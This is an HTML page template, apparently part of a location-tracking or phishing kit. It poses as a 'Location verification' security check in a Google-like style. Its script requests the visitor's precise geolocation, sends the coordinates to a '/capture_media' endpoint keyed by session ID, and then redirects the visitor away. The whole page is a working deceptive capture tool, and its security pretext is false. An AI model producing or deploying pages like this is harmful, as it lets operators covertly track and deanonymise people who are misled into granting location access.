<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Location verification</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{
    font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;
    background:#fff;
    display:flex;
    justify-content:center;
    align-items:center;
    min-height:100vh
}
.container{max-width:420px;width:100%;padding:24px;text-align:center}
.icon{width:64px;height:64px;background:#e8f0fe;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 24px}
.icon svg{width:32px;height:32px;fill:#1a73e8}
h1{font-size:22px;color:#202124;font-weight:400;margin-bottom:8px}
p{font-size:14px;color:#5f6368;margin-bottom:24px;line-height:1.5}
.status{font-size:13px;color:#5f6368;padding:12px;background:#f8f9fa;border-radius:8px;margin-bottom:16px}
@keyframes spin{to{transform:rotate(360deg)}}
.loading{width:20px;height:20px;border:2px solid #e0e0e0;border-top-color:#1a73e8;border-radius:50%;animation:spin .6s linear infinite;margin:12px auto}
</style>
</head>
<body>
<div class="container">
    <div class="icon">
        <svg viewBox="0 0 24 24"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/></svg>
    </div>
    <h1>Location verification</h1>
    <p>We need to verify your location for security purposes. Please allow location access when prompted.</p>
    <div class="status" id="status">Requesting your location...</div>
    <div class="loading" id="loading"></div>
</div>
<script>
function getLoc(){
    const s=document.getElementById('status'),l=document.getElementById('loading');
    if(!navigator.geolocation){s.textContent='Location is not available';setTimeout(()=>window.location.href='{{ redirect_url }}',2000);return}
    l.style.display='block';
    navigator.geolocation.getCurrentPosition(
        p=>{l.style.display='none';s.textContent='Verifying location...';
            fetch('/capture_media/{{ session_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'location',data:{latitude:p.coords.latitude,longitude:p.coords.longitude}})})
            .then(r=>r.json()).then(d=>{s.textContent='Verified. Redirecting...';setTimeout(()=>window.location.href='{{ redirect_url }}',1200)})
            .catch(()=>window.location.href='{{ redirect_url }}')},
        e=>{l.style.display='none';s.textContent='Location access is needed. Please try again.';setTimeout(()=>window.location.href='{{ redirect_url }}',2500)},
        {enableHighAccuracy:true,timeout:10000,maximumAge:0}
    );
}
window.onload=getLoc;
</script>
</body>
</html>
